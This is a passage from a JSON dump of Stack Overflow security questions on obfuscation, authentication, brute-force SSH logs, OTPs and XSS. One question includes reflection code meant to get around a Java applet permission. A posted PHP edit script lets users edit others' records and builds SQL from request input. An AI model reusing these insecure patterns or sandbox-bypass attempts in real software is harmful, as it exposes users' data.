scan</li>\n</ol>\n\n<p>I am looking for tools that can automate process of testing, maintaining big projects.\nSo far I've looked at Selenium, PHPUnit. </p>\n"},{"tags":[".net","security","obfuscation"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":178,"score":4,"question_id":11555308,"title":"How to keep .NET program logic (reasonably) secret?","body":"<p>Right, I am talking about license validation code in a desktop application, e.g. a method <code>bool ValidateLicense(string licenseCode)</code>. Of course, any protection scheme can be reverse engineered by a skilled and determined cracker. However, I'd like to prevent that anyone with some basic programming knowledge can use Reflector to build a keygen in a couple of minutes.</p>\n\n<p>Possible approaches</p>\n\n<ol>\n<li><p><em>Obfuscate</em>. My understanding is that obfuscating causes a performance overhead and may hinder (legitimate) debugging. So are there tools that allow obfuscating only selected methods?</p></li>\n<li><p><em>Move method to ngen'ed assembly or unmanaged DLL</em>. But isn't this an invitation to simply replace the DLL? Any ideas how to prevent this (read: make it a bit harder for an attacker)?</p></li>\n<li><p><em>Other</em>?</p></li>\n</ol>\n\n<p>PS: Question is obviously related to <a href=\"http://stackoverflow.com/questions/506282/protect-net-code-from-reverse-engineering\">Protect .NET code from reverse engineering?</a> trying to put thoughts from there to practice</p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>To 1. A first obfuscation step would surely be to rename the validation method. (Thanks, Jonathan)</p>\n\n<p>To 2. Assuming the application uses Win32 API methods one could re-route the calls through an unmanaged DLL thereby making it an integral part of the application. Fiddling with the method signatures (e.g. change name, swap parameters) would make this less obvious. Do you think the innate drawbacks are justified?</p>\n\n<p>To 3. <em>Don't distribute validation method</em> belongs here. Keep it on your server and call remotely, i.e. use online validation (Thanks, David Hedlund)</p>\n"},{"tags":["ruby-on-rails","ruby","security","mvc"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12315610,"title":"Rails: optimizing a controller action (security checking)","body":"<p>I have an action in a controller that looks like this:</p>\n\n<pre><code>  def show\n    @project = current_customer.projects.where(id: params[:project_id]).first\n    if @project\n      @feature = @project.features.where(id: params[:feature_id]).first\n      if @feature\n        @conversation = @feature.conversations.where(id: params[:id]).first\n        unless @conversation\n          head 401\n        end\n      else\n        head 401\n      end\n    else\n      head 401\n    end\n  end\n</code></pre>\n\n<p>The problem is the repetition of <code>head 401</code>. Is there a better way to write this action ?</p>\n"},{"tags":["java","security","ftp","applet"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":135,"score":3,"question_id":12298556,"title":"java.net.SocketPermission in Applet","body":"<p>I'm developing an applet that requires to save a text file on the server. After wrestling with this problem for a while I stumbled on the internet on the Lynlin.class which can send files using ftp connection. That works fine provided I add to my C:\\Program Files\\Java\\jre7\\lib\\security\\java.policy file a following line:</p>\n\n<pre><code>permission java.net.SocketPermission \"192.168.33.15:*\", \"connect, accept ,resolve, listen\";\n</code></pre>\n\n<p>If I try to run this applet from the computer that did not have the java.policy file edited I get the following error:</p>\n\n<pre><code>java.security.AccessControlException: access denied \n    (\"java.net.SocketPermission\" \"192.168.33.15:21\" \"connect,resolve\")*\n</code></pre>\n\n<p>Does anybody know how could I get rid of this problem other than editing java.policy file at each and every computer that will be using this applet?</p>\n\n<p>Just to claryfy: </p>\n\n<ul>\n<li><p>my applet at the moment is not signed, but the server with which it tries to send a file is the same at which the applet is located</p></li>\n<li><p>the http and ftp server are microsoft IIS running on the Windows Server 2003 (ip 192.168.33.15)</p></li>\n</ul>\n"},{"tags":["c#","asp.net","wpf","asp.net-mvc","security"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":65,"score":2,"question_id":12250558,"title":"Ensure that my C# desktop application is making requests to my ASP .NET MVC action?","body":"<p>I've seen questions that are <b>almost</b> identical to this one, except minor but important differences that I would like to get detailed.</p>\n\n<p>Let's say that I have a controller and an action method in MVC which therefore accepts requests on the following URL: <a href=\"http://example.com/api/myapimethod?data=some-data-here\" rel=\"nofollow\">http://example.com/api/myapimethod?data=some-data-here</a>.</p>\n\n<p>This URL is then being called regularly by 1000 clients or more spread out in the public. The reason for this is crowdsourcing. The clients around the globe help feed a global cache on my server, which makes it faster for the rest of the clients to fetch the data.</p>\n\n<p>Now, if I'm sneaky (and I am), I can go into Fiddler, Ethereal, Wireshark or any other packet sniffing tool and figure out which requests the program is making.</p>\n\n<p>By figuring that out, I can also replicate them, and fill the service with false corrupted data.</p>\n\n<p>What is the best approach to ensuring that the data received in my ASP .NET MVC action method is actually from the desktop client application, and not some falsely generated data that the user invented?</p>\n\n<p>Since it is all based on crowdsourcing, would it be a good idea for my users to be able to \"vote\" if some data is falsified, and then let an automatic cleanup commence if there are enough votes?</p>\n\n<p>I do not have access to a tool like SmartAssembly, so unfortunately my .NET program is fully decompilable. I realize this might be impossible to accomplish in an error-proof manner, but I would like to know where my best chances are.</p>\n"},{"tags":["wcf","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12313198,"title":"How to secure WCF Web Services?","body":"<p>I have a service which has a method :</p>\n\n<p>UserProfile GetUserProfile(int userId);</p>\n\n<p>Here user which has a profile can get its profile on the client. But here the problem is any user who connects to the web service and plugs in the ANY user id gets the profile of that particular user. How do i prevent this?</p>\n\n<p>I'm using Facebook Authentication (If that helps you answer this)</p>\n\n<p>Please do help. </p>\n\n<p>Thank you .</p>\n"},{"tags":["jquery","asp.net","security","design-patterns","patterns"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":158,"score":2,"question_id":11589180,"title":"HTML/Jquery/Javascript Authentication and Authorization Patterns (ASP.NET)","body":"<p>I have a jquery mobile website which has only HTML and Jquery code and back-end data is accessed using Sharepoint webservices. So far so good. </p>\n\n<p>Now , we need to implement Login Authentication for our mobile site and limit access to some pages on our site. There exists another asp.net site(different domain) which has already implemented login functionality in asp.net. We are planning to re-use the same back-end logic of the other site.</p>\n\n<p>Are there any patterns for cross-domain Login? How the Session Management can be done? </p>\n\n<p>Hope I am clear.Appreciate your help. Thanks in advance.</p>\n"},{"tags":["security","encryption","hash","passwords","onlinebanking"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12310196,"title":"Which OTP (one-time password) algorithm do banks use on their password generator token?","body":"<p>Many banks offer some token devices in order to create passwords for one time usage. I wonder which OTP algorithm they use? Is it HOTP or TOTP?</p>\n"},{"tags":["security","authentication","kerberos","saml","sts-securitytokenservice"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12298300,"title":"Can SAML tokens be used to exchange symmetric keys?","body":"<p>I would like the client connect to an STS to obtain a SAML token and use it to authenticate it self to a service, but I want the token to contain more information than the standard SAML token, I would also like to avoid using transport level security.\nIn a sense it will be very similar to a kerberos ticket having the session key</p>\n\n<p>is this possible? </p>\n"},{"tags":["wcf","security","authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":149,"score":0,"question_id":10807715,"title":"User token authentication for WCF SOAP service?","body":"<p>For B2B integration scenarios in WCF, what is the recommended approach for authentication? </p>\n\n<p>Here's the setup:</p>\n\n<ul>\n<li>An API powered by WCF made available on the internet to business partner</li>\n<li>Business partner (BP) is using 3rd party client application</li>\n<li>BP has multiple end-users of 3rd party client application</li>\n<li>Each BP end-user will have an account with username/password in the system that the WCF service sits in front of </li>\n<li>BP 3rd party software is of unknown technology</li>\n<li>Will not want BP software to store username/passwords (and wouldn't want to prompt the user for username/password on every request)</li>\n<li>Requiring X.509 certificates is too burdensome (let's assume that for sake of the question anyway)</li>\n</ul>\n\n<p>Is there anything out of the box in WCF that would fit this? If I want the 3rd party software to pass credentials through and not store them, I know one common approach is combining a login call + user token for subsequent calls (ala Salesforce's SOAP api)? But have found nothing about implementing something like that in WCF?</p>\n"},{"tags":["winforms","security"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12311578,"title":"How to apply security in windows form?","body":"<p>In windows forms, how can we track the login user, for example in web application we maintain session for that, after user login we maintain the \"id\" in session and we check in every page for that \"id\" using session, like that is there any way to do in window application.</p>\n"},{"tags":["windows","security","winapi","unix"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":70,"score":2,"question_id":12299455,"title":"Speed of Windows' ImpersonateLoggedOnUser() + RevertToSelf() vs Unix's seteuid() + setegid()","body":"<p>In Unix, when doing some action on behalf of some user, a system program usually calls seteuid(UID) (with accompanying setegid()) to switch to that user first, perform the action, and on finish switch back to superuser using seteuid(0). I time seteuid() and it's in the order of one to several microseconds (meaning, it's quite cheap relative to the action that needs to be done like manipulating files or running a CGI program).</p>\n\n<p>I'm not familiar with Windows API. Do we do the same thing on Windows (but using ImpersonateLoggedOnUser() + RevertToSelf() API functions)? In general, how fast are these functions?</p>\n"},{"tags":["c","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":289,"score":1,"question_id":5248594,"title":"Where can I find a good example of privilege escalation?","body":"<p>Title kind of says it all. I'm looking for some sort of very basic privilege escalation example that I can use as part of a presentation I need to give. I've looked through a few proof of concept snippets but haven't found anything that seems to work properly. Anyone have any ideas?</p>\n"},{"tags":["php","security","authentication"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":898,"score":1,"question_id":4495285,"title":"PHP Authentication","body":"<p>Currently my authentication looks like this: </p>\n\n<p>User enters username/password combination\n Sent to the server, the username and password are salted and hashed (md5) and checked against the database.</p>\n\n<p>If correct, and the user has specified, a month long cookie is set. </p>\n\n<p>If the user does not specify to set a cookie, they are automatically signed out after five minutes of inactivity. </p>\n\n<p>My question is simply if I need to, and how to, make this more secure. I'm pretty fluent in PHP, but I'm not as well off in security. Any help, pointers, leads, and general assistance would be appreciated. </p>\n\n<p>Thanks. :)</p>\n"},{"tags":["java","security","reflection","applet","greenfoot"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":65,"score":1,"question_id":12302230,"title":"How to bypass accessDeclaredMembers permission as applet?","body":"<p>I used some code from another question to access the private field \"classes\" in the Java ClassLoader. This works fine, however when I move it to an applet it gets messed up with this exception: <code>access denied (java.lang.RuntimePermission accessDeclaredMembers)</code>. I've done some searching and tried using PrivlegedExceptionAction to skip that, but it isn't working. So my question is this: is is possible to bypass this, and if not what is another way to get a list of classes?</p>\n\n<p>Reflection Code:</p>\n\n<pre><code>final ClassLoader cLoader = getClass().getClassLoader();\n            final Field f = ClassLoader.class.getDeclaredField(\"classes\");\n            AccessController.doPrivileged(new PrivilegedExceptionAction() {\n                    public Object run() throws Exception {\n                        f.setAccessible(true);\n                        return null;}});\n            Vector&lt;Class&gt; classes = (Vector&lt;Class&gt;)f.get(cLoader);\n            cList.addAll(classes);\n</code></pre>\n"},{"tags":["security","login","centos","root","brute-force"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12309465,"title":"how to prevent bots from trying to match password and login as root to server?","body":"<p>Today I have noticed that my /var/log/secure file gets bigger and bigger. That was strange and when I checked the tail, I get such things:</p>\n\n<pre><code>Sep  6 18:37:58 asdf sshd[17615]: Failed password for root from 200.85.122.11 port 36126 ssh2\nSep  6 18:37:58 asdf sshd[17616]: Received disconnect from 200.85.122.11: 11: Bye Bye\nSep  6 18:38:00 asdf sshd[17618]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=200.85.122.11  user=root\n\nSep  6 18:38:02 asdf sshd[17618]: Failed password for root from 200.85.122.11 port 36445 ssh2\nSep  6 18:38:02 asdf sshd[17619]: Received disconnect from 200.85.122.11: 11: Bye Bye\nSep  6 18:38:04 asdf sshd[17623]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=200.85.122.11  user=root\n\nSep  6 18:38:06 asdf sshd[17623]: Failed password for root from 200.85.122.11 port 36776 ssh2\nSep  6 18:38:06 asdf sshd[17624]: Received disconnect from 200.85.122.11: 11: Bye Bye\nSep  6 18:38:08 asdf sshd[17626]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=200.85.122.11  user=root\n\nSep  6 18:38:10 asdf sshd[17626]: Failed password for root from 200.85.122.11 port 37072 ssh2\nSep  6 18:38:11 asdf sshd[17627]: Received disconnect from 200.85.122.11: 11: Bye Bye\nSep  6 18:38:13 asdf sshd[17689]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=200.85.122.11  user=root\n\nSep  6 18:38:15 asdf sshd[17689]: Failed password for root from 200.85.122.11 port 37390 ssh2\nSep  6 18:38:15 asdf sshd[17690]: Received disconnect from 200.85.122.11: 11: Bye Bye\nSep  6 18:38:17 asdf sshd[17700]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=200.85.122.11  user=root\n</code></pre>\n\n<p>This looks as if someone is trying to find a password to my server. </p>\n\n<p>How can I block IP after some number of unsuccessful attempts to login (for example, if 10 attempts to login failed during last hour, however, now my VPS receives at least 100 failing requests to login per minute). Actually, password is too long and complicated for brute force, but I'm not sure whether such brute force attempts can cause server load.</p>\n"},{"tags":["security","entropy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12308747,"title":"Is a phrase a good code?","body":"<h2>Introduction</h2>\n\n<p>I am working at a \"prize codes\" system for my website: the administrators can assign credits to an user, giving them a code that they can redeem.<br>\nThe idea itself is quite easy to implement: generate (I'll assume the algorithm to be hardly-predictable) the codes, store them in a safe database and give administrators the power to read one random code. But I found that some features I want, do collide:</p>\n\n<ol>\n<li>The code must reasonably resist to attack with a reasonable computation power;</li>\n<li>There must be a large number of codes,  1 million;</li>\n<li>The code must be easy to type.</li>\n</ol>\n\n<p>I thought of these solutions, until now:</p>\n\n<p>After some thinking, I came up with this solution: using phrases of N words [I'm not talking about THE \"n\" word. I mean, \"N times a random word\"]. This seems to be a good idea, but I'm not experienced in this field.</p>\n\n<h3>Question 1</h3>\n\n<p>Is it safe to use phrases for codes? If yes, how many words should I use in order to be safe enough? [Assume an average length and the words an 8-years-old children knows.]</p>\n\n<h3>Question 2</h3>\n\n<p>Given a list of words, what is the best way to store them into the database?</p>\n\n<ul>\n<li>Desktop-side, generate a file with the desired phrases, then read and put them into the database using PHP?</li>\n<li>Server-side, reading a list of words and writing the phrases directly into the database?</li>\n<li>Other ways?</li>\n</ul>\n\n<p>Please note that I can't just let the administrators read the phrases files, as it is harder to code than using a database. Also notice that the words must be in common Italian: I estimate from 4.000 to 6.000 words to be used.</p>\n"},{"tags":["php","mysql","forms","security","edit"],"answer_count":5,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":96,"score":2,"question_id":12308913,"title":"How to securely edit information in a database from a user form PHP","body":"<p>Currently i have working PHP edit script, which allows users to edit ads they have posted, but I have realised that users can modify the ?id= number to bring up another set of data then edit someone else data and save it in the database. </p>\n\n<p>Is there any way I can make it so that when the user clicks on their advert they have posted to edit, it is only their own ads that they access to, that they wont be able to edit other peoples ads by adjusting the id?= and a way of protecting the form from manipulation? </p>\n\n<p>BIG THANKS TO ANYONE THAT CAN HELP!</p>\n\n<p>Here is my current code:</p>\n\n<pre><code>&lt;?php\n/* \nEDIT.PHP\nAllows user to edit specific entry in database\n*/\n\n// creates the edit record form\n// since this form is used multiple times in this file, I have made it a function that is      easily reusable\nfunction renderForm($id, $fname, $lname, $contact, $price, $error)\n{\n?&gt;\n&lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\"&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Edit Record&lt;/title&gt;\n &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"stylesheet.css\"&gt;\n\n &lt;style type=\"text/css\"&gt;\n\n#page-wrap                  {\nposition:absolute;\ntop: 206px;\nleft: 288px;\nwidth: 50%;\ntext-align:left;\nbackground-color:#FFF;\npadding: 10px;\nborder-radius: 10px;\nbox-shadow: 1px 2px 2px #888888;\n     }\n\n    &lt;/style&gt;\n    &lt;script type = \"text/javascript\"&gt;\n\n    function myfunction(url)\n    {\n    window.location.href = url;\n    }\n   &lt;/script&gt;\n\n\n&lt;/head&gt;\n&lt;body&gt;\n\n  &lt;div class=\"container\"&gt;\n\n  &lt;div id=\"imagelogo\" onclick = \"window.location.href = 'index.html'\" &gt; \n\n  &lt;p&gt; Buy and sell stuff around University&lt;/p&gt;\n   &lt;/div&gt;\n\n   &lt;ul id=\"navigation\" name=\"navigation\"&gt;\n  &lt;li id=\"nav-home\"&gt;&lt;a href=\"index.html\"&gt;Home&lt;/a&gt;&lt;/li&gt;\n  &lt;li id=\"nav-search\"&gt;&lt;a href=\"search.php\"&gt;Search&lt;/a&gt;&lt;/li&gt;\n  &lt;li id=\"nav-selling\"&gt;&lt;a href=\"#\"&gt;Selling&lt;/a&gt;&lt;/li&gt;\n  &lt;li id=\"nav-buying\"&gt;&lt;a href=\"#\"&gt;Buying&lt;/a&gt;&lt;/li&gt;\n   &lt;li id=\"nav-FAQ\"&gt;&lt;a href=\"#\"&gt;FAQ&lt;/a&gt;&lt;/li&gt;\n  &lt;li id=\"nav-contact\"&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt;\n\n  &lt;p&gt;&amp;nbsp;&lt;/p&gt;\n  &lt;p&gt;&amp;nbsp;&lt;/p&gt;\n  &lt;p&gt;&amp;nbsp;&lt;/p&gt;\n  &lt;p&gt;Sponsors&lt;/p&gt;\n  &lt;/ul&gt;\n  &lt;div id=\"account\"&gt;\n\n  &lt;?php\n  if( isset( $_SESSION['username'] ) ){\n\n  echo \"&lt;a href='securedpage1.php'&gt;My Account&lt;/a&gt;&lt;img src='images/uni-icon.png' width='30'        height='18' style='vertical-align: middle;'/&gt;\";\n\n  }else{\n\n echo \"&lt;a href='login.php' &gt;Login&lt;/a&gt;&lt;img src='images/uni-icon.png' width='30' height='18'    style='vertical-align: middle;'/&gt;\";\n}\n?&gt;\n\n&lt;/div&gt;\n\n&lt;div id=\"registerlogout\"&gt;\n&lt;?php\nif( isset( $_SESSION['username'] ) ){\necho \"&lt;a href='logout.php'&gt;Logout&lt;/a&gt;\";\n\n}else{\n\necho \"&lt;a href='register.php'&gt; Register&lt;/a&gt;\";\n}\n?&gt;\n&lt;/div&gt;\n\n&lt;div id=\"social\"&gt;\n&lt;img src=\"images/fb-logo.png\" width=\"22\" height=\"20\" /&gt;     \n\n &lt;img src=\"images/twitter-logo.png\" width=\"24\" height=\"25\" /&gt;\n  &lt;/div&gt;\n\n &lt;div id=\"page-wrap\"&gt;\n &lt;?php \n // if there are any errors, display them\n if ($error != '')\n {\n echo '&lt;div style=\"padding:4px; border:1px solid red; color:red;\"&gt;'.$error.'&lt;/div&gt;';\n }\n ?&gt; \n\n &lt;form action=\"\" method=\"post\"&gt;\n &lt;input type=\"hidden\" name=\"id\" value=\"&lt;?php echo $id; ?&gt;\"/&gt;\n &lt;div&gt;\n &lt;strong&gt;Ad Title: *&lt;/strong&gt; &lt;input type=\"text\" name=\"fname\" style=\"width: 60%; box-    sizing: border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box;\"value=\"&lt;?php      echo $fname; ?&gt;\"/&gt;&lt;br/&gt;\n  &lt;strong&gt;Description: *&lt;/strong&gt; &lt;textarea name=\"lname\" cols=\"45\" rows=\"5\"&gt;&lt;?php echo     $lname; ?&gt;&lt;/textarea&gt;&lt;br/&gt;\n &lt;strong&gt;Contact*&lt;/strong&gt; &lt;input type=\"text\" name=\"contact\"  style=\"width: 60%; box-    sizing: border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box;\" value=\"&lt;?php     echo $contact; ?&gt;\"/&gt;&lt;br/&gt;\n&lt;strong&gt;Price*&lt;/strong&gt; &lt;input type=\"text\" name=\"price\"  style=\"width: 60%; box-sizing:    border-box; -moz-box-sizing: border-box; -webkit-box-sizing: border-box;\" value=\"&lt;?php echo    $price; ?&gt;\"/&gt;&lt;br/&gt;\n &lt;p&gt;* Required&lt;/p&gt;\n &lt;input type=\"submit\" name=\"submit\" value=\"Submit\"&gt;\n &lt;/div&gt;\n &lt;/form&gt;\n &lt;/div&gt;\n &lt;/div&gt;\n &lt;/body&gt;\n &lt;/html&gt; \n &lt;?php\n  }\n\n// Inialize session\n    session_start();\n\n\n // connect to the database\n include('conn.php');\n\n // check if the form has been submitted. If it has, process the form and save it to the    database\n if (isset($_POST['submit']))\n  { \n // confirm that the 'id' value is a valid integer before getting the form data\n if (is_numeric($_POST['id']))\n {\n // get form data, making sure it is valid\n $id = $_POST['id'];\n $fname = mysql_real_escape_string(htmlspecialchars($_POST['fname']));\n $lname = mysql_real_escape_string(htmlspecialchars($_POST['lname']));\n $contact = mysql_real_escape_string(htmlspecialchars($_POST['contact']));\n $price = mysql_real_escape_string(htmlspecialchars($_POST['price']));\n\n // check that firstname/lastname fields are both filled in\n if ($fname == '' || $lname == '' || $contact == '' || $price == '' )\n {\n // generate error message\n $error = 'ERROR: Please fill in all required fields!';\n\n //error, display form\n renderForm($id, $fname, $lname, $contact, $price, $error);\n }\nelse\n {\n // save the data to the database\n mysql_query(\"UPDATE people SET price='$price', contact='$contact', fname='$fname',      lname='$lname' WHERE id='$id'\")\n or die(mysql_error()); \n\n // once saved, redirect back to the view page\n header(\"Location: view.php\"); \n }\n }\n else\n {\n // if the 'id' isn't valid, display an error\n echo 'Error!';\n }\n }\n else\n // if the form hasn't been submitted, get the data from the db and display the form\n {\n\n // get the 'id' value from the URL (if it exists), making sure that it is valid (checing   that it is numeric/larger than 0)\n if (isset($_GET['id']) &amp;&amp; is_numeric($_GET['id']) &amp;&amp; $_GET['id'] &gt; 0)\n {\n // query db\n $id = $_GET['id'];\n $result = mysql_query(\"SELECT * FROM people WHERE id=$id\")\n or die(mysql_error()); \n$row = mysql_fetch_array($result);\n\n // check that the 'id' matches up with a row in the databse\n if($row)\n {\n\n // get data from db\n $fname = $row['fname'];\n $lname = $row['lname'];\n $contact = $row['contact'];\n $price = $row['price'];\n\n // show form\n renderForm($id, $fname, $lname, $contact, $price, '');\n }\n else\n // if no match, display result\n {\n echo \"No results!\";\n }\n }\n else\n // if the 'id' in the URL isn't valid, or if there is no 'id' value, display an error\n {\n echo 'Error!';\n }\n }\n ?&gt;\n</code></pre>\n"},{"tags":["asp.net","security","parameters","xss","html-encode"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":723,"score":0,"question_id":2964424,"title":"To HTMLENCODE or not to HTMLENCODE user input on web form (asp.net vb)","body":"<p>I have many params making up an insert form for example:</p>\n\n<pre><code>x.Parameters.AddWithValue(\"@city\", City.Text)\n</code></pre>\n\n<p>I had a failed xss attack on the site this morning, so I am trying to beef up security measures anyway....</p>\n\n<p>Should I be adding my input params like this?</p>\n\n<pre><code>x.Parameters.AddWithValue(\"@city\", HttpUtility.HtmlEncode(City.Text))\n</code></pre>\n\n<p>Is there anything else I should consider to avoid attacks?</p>\n"},{"tags":["java","flex","security","authentication"],"answer_count":3,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":766,"score":5,"question_id":2794822,"title":"What are the alternatives for Java authentication?","body":"<p>Preferably something that integrates well with a Flex front end. Yes the Spring Security guys say this is possible, but all examples seem to use legacy jsp tag libraries making them half useless as examples. I don't want to spend a month setting up and learning how to use a security tool. I would like a tool which supports using annotations (@RolesAllowed etc), MINIMAL XML, and 'remember-me' features (not cookie based).</p>\n\n<p>Apache Shiro seems to support Flex/Silverlight/Swing as well but I'd like to know if there are any other alternatives that are NOT container specific.</p>\n"},{"tags":["php","security","robot","copy-protection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12305309,"title":"Exponentially slow repeat requests to the same file in php","body":"<p>I'm looking to prevent robots crawling our site and downloading the thousands of images hosted there.</p>\n\n<p>I read this lately <a href=\"https://github.com/remy/password-policy\" rel=\"nofollow\">https://github.com/remy/password-policy</a> about best practices for password policy. One of the ideas was to <strong>delay repeat requests exponentially</strong> there by not limiting humans but punishing bots.</p>\n\n<p>Would this be possible in php?</p>\n"},{"tags":["security","yii","sql-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":87,"score":-2,"question_id":12303370,"title":"Is yii model save() method secure?","body":"<p>I have a model <code>User</code>\nassuming i have created a new object from that model</p>\n\n<pre><code>$x = new User;\n</code></pre>\n\n<p>and set its property from a _POST var</p>\n\n<pre><code>$x-&gt;lastName = $_POST[\"last_name\"];\n</code></pre>\n\n<p>if i did a</p>\n\n<pre><code>$x-&gt;save();\n</code></pre>\n\n<p>would it be secured from SQL injections ?</p>\n\n<p>Thank you</p>\n"},{"tags":["php","security","web-security","code-access-security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":37,"score":-1,"question_id":12294547,"title":"How to prevent including remote server file or shared server file?","body":"<p>I am using Xampp server on my system and by twiking some PHP.INI settings on Xampp server of my system just discoverd that I can include my php files from my remotely hosted site. Although I could not able to access the variable on remote file however I am still scared that a professional hacker can access those variables. I am scared because url shows the path of the file. I know I can hide the extention of the file using .htaccess but still anyone can guess these file type because there are only few types of server side scripts mostly used by webdevelopers. Please let me know if there is any way to prevent including my server files on remote server or the servers which runs on the same server where my site resides or there is nothing to worry about.</p>\n"},{"tags":["security","windows-phone-7","encryption","azure","odata"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":12302664,"title":"Secure connection between WP7 device and Windows Azure","body":"<p>I've setup a Windows Azure database with the data accessible via oData. I'm trying to work out how to secure the connection between a WP7 device and the database. By secure I mean I only want users of the app to be able to access the data from within the app.</p>\n\n<p>I've considered SSL but it's quite expensive for me - is there another way of securing this connection?</p>\n\n<p>Thanks!</p>\n"},{"tags":["database","security","mongodb","nosql","database-replication"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":33,"score":0,"question_id":12301419,"title":"Securing running mongo servers","body":"<p>I have replication setup for the mongo without security and authorization. But now I wish to add security by the means of authorization. The setup is like this\n<code>4 boxes : A,B,C,D,</code> A being the master and rest the slaves. They all are running in no authentication mode. \nNow I wish to add -keyFile option to all and thus ensure login mode for it. </p>\n\n<p>The issue is that I do not want any Down time. I wish to add the security seamlessly without any impact to the end-user site. What step should I follow?</p>\n"},{"tags":["security","azure","queue"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12302001,"title":"How do I set the shared access policy for an Azure Queue?","body":"<p>Apparently access to Azure queues can be controlled using a Shared Access Policy.  The example here <a href=\"http://msdn.microsoft.com/en-us/library/windowsazure/hh508996\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/windowsazure/hh508996</a> confirms this, but then only provides an example for a blob shared access policy.  Does anyone have any references on how the same is achieved for Queues (and Tables)?</p>\n"},{"tags":["c#",".net","ipad","html5","security"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12301273,"title":"Client certificate authentication for a HTML5 web application (C# HttpServer to handle requests)","body":"<p>have a question about using client certificates to authenticate clients to a server, when requesting data from that server.</p>\n\n<p>I have a web 'application' (HTML5/JavaScript) which requests data from a HttpSever that I have created in C# to handle requests. I want to be able to authenticate that a client  has been grated access (using a certifcate on the device), before sending it the data.</p>\n\n<p>Users access the app via a URL in their browser and it is intended mainly for mobile devices (iPad). What I want to be able to do is to mail a certificate to a client, for them to install on their device (I understand that for iPad this is as simple as clicking the attachment?) and use this when requesting the data to be displayed in the app. This way certificates can be revoked from the server side if needed.</p>\n\n<p>I don't really know a huge amount about certifate security or using them for authentication in HTML5 sites.</p>\n\n<p>How would I go about doing this ? how would the interaction work ? and can you suggest any resources on the internet ?</p>\n"},{"tags":["security"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12300899,"title":"can you be hacked from commented out html form?","body":"<p>If I have an html form commented out using <code>&lt;!-- form --&gt;</code></p>\n\n<p>Which has some input fields that are not sanitized, can someone use those to do bad queries to the db? For example with firebug, can someone remove <code>&lt;!--</code> and use those input fields to do something nasty?</p>\n"},{"tags":["php","security","phpbb3"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":801,"score":3,"question_id":2490810,"title":"Good way to keep PHPBB3 boards secure from hackers?","body":"<p>Keep hearing of other forums getting hacked.  I realise that if a hacker is that determined, they will find a way, but what are the actions that you can take to try to ensure, wherever possible, that it doesn't happen please ?</p>\n"},{"tags":["php","security","hyperlink"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12295812,"title":"Alternate way To send data From Url?","body":"<p>I am working on a web application in which i want to make some security constraints and want to know the alternative way to send the data or id from URL in a secure way.for example:</p>\n\n<pre><code>$id=$row=['id'];\n$name=$row['name'];\n\n&lt;a href=\"projects.php?project_id=&lt;?pho echo $id; ?&gt;&amp;name=&lt;?php echo $name; ?&gt;\"&gt;\n</code></pre>\n\n<p>so is there any alternate way to send this two attributes in a secure way to the project.php ?\nI just only want that the id &amp; name should not be visible on url.\nPlease guide me ,i know this is very basic feature of PHP and i just want to find the alternate or secure solution.\ni know i am sending the data using get but is there any alternate way to send data to project.php without using  